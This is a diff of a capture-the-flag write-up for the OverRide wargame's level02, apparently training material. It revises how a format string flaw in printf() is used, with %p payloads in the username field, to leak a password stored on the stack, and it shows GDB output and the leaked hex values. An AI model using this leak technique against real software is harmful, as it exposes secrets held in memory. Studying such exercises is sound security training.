@@ -9,7 +9,7 @@ Level02 rights:
 -rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
 ```
 
-The program ask for a username and a password:
+The program asks for a username and password:
 ```Shell
 level02@OverRide:~$ ./level02 
 ===== [ Secure Access System v1.0 ] =====
@@ -22,49 +22,38 @@ level02@OverRide:~$ ./level02
 name does not have access!
 ```
 
-Decompiling with Hex-Rays on https://dogbolt.org/ shows four things:
-- the program open the password file and stores it in a buffer
-- it store our input in two different buffer
-- a format string attack is possible because the buffer storing the username input
-is used as a format string by `printf()`.
-- the comparison between the password and our input is performed over 40 bytes,
-so we can deduce that this is the length of the password.
-Since the program stores the password on the stack and that we know its length, we will exploit `printf()` to display it.
+Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
+- the program opens the password file and stores it in a buffer
+- `printf()` is used to display the username, but it is vulnerable to format string attack
+- the comparison between the password and our input is performed over 40 bytes, so we can deduce that this is the length of the password.
+Since it is stored on the stack, we will exploit `printf()` with the `%p` specifier to display it.
 
-Our buffer is the 28th argument of printf
+First, let's use GDB to take a look at the three memory allocations:
 ```Shell
-level02@OverRide:~$ ./level02 
+(gdb) disas main
+[...]
+   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx           // user_pass[112]
+[...]
+   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx           // password[48]
+[...]
+   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx          // user_name[112]
+[...]
+ ```
+There is an offset of 48 bytes beetween the password buffer and the user_name buffer. So we know taht only the first 40 bytes will contain the password.
+
+Next, we need to print the stack and find out where our buffer is, and this allows us to also peek at values stored higher on the stack:
+```Shell
+level02@OverRide:~$ ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
 \**************************************/
---[ Username: AAAAAAAA %28$p
---[ Password: 
+--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+--[ Password: coucou
 *****************************************
-AAAAAAAA 0x4141414141414141 does not have access!
+AAAAAAAA 0x7fffffffe500 (nil) 0x63 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x756f63756f63 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x4141414141414141 0x2520702520702520 0x2070252070252070 does not have access!
 ```
-
-Using Gdb we see three memory allocation:
-- the first one of 112 bytes (0x70)
-- the second one of 48 bytes (0xa0 - 0x70)
-- the third one of 112 bytes (0x110 - 0xa0)
-```Shell
-(gdb) disas main
-[...]
-   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx
-[...]
-   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx
-[...]
-   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx
-[...]
- ```
-This corresponds to the three buffer, the buffer of 48 bytes is used to store the password.
-Thanks to the disassemble code we know that the second buffer stores the password
-and the third one retrieves the username input. There is an offset of 48 bytes beetween them.
-
-
-Since each address is 8 bytes and that we use %p to print the password, the buffers are
-separate by 6 (48 / 8) arguments, and we need to print 5 arguments (40 / 8) to display the entire password.
+The user_name buffer starts at the 28th argument, `0x4141414141414141`. The 27th argument contains the last 8 bytes of the pass buffer, so we can skip that and get the 5 previous arguments (40 / 8, as addresses are 8 bytes long) to display the entire password.
 
 ```Shell
 level02@OverRide:~$ ./level02 
@@ -78,8 +67,12 @@ level02@OverRide:~$ ./level02
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
 ```
 
-Using a Python script, we will convert these five hexadecimal integers into 8-character
-strings, reverse them due to little-endian format, and concatenate them to obtain the final password.
+Good, we have the entire password, but we need to:
+- convert each value from hexadecimal to characters
+- reverse them from little endian to big endian
+- concatenate each strings to form the final password.
+
+Using a python script can help make it fast and easy:
 ```Python
 >>> hex_values = [
 ...     "756e505234376848",
